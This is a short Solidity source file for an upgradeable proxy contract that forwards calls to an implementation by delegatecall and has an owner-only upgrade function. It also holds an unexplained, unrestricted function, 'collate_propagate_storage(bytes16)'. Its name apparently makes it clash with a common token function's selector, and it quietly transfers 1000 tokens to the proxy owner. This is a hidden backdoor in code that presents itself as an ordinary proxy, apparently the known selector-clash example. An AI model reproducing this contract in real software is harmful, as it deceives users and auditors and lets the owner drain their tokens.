pragma solidity ^0.5.0;

contract Proxy {
    
    address public proxyOwner;
    address public implementation;

    constructor(address implementation) public {
        proxyOwner = msg.sender;
        _setImplementation(implementation);
    }

    modifier onlyProxyOwner() {
        require(msg.sender == proxyOwner);
        _;
    }

    function upgrade(address implementation) external onlyProxyOwner {
        _setImplementation(implementation);
    }

    function _setImplementation(address imp) private {
        implementation = imp;
    }

    function () payable external {
        address impl = implementation;

        assembly {
            calldatacopy(0, 0, calldatasize)
            let result := delegatecall(gas, impl, 0, calldatasize, 0, 0)
            returndatacopy(0, 0, returndatasize)

            switch result
            case 0 { revert(0, returndatasize) }
            default { return(0, returndatasize) }
        }
    }

    function collate_propagate_storage(bytes16) external {
        implementation.delegatecall(abi.encodeWithSignature(
            "transfer(address,uint256)", proxyOwner, 1000
        ));
    }
}
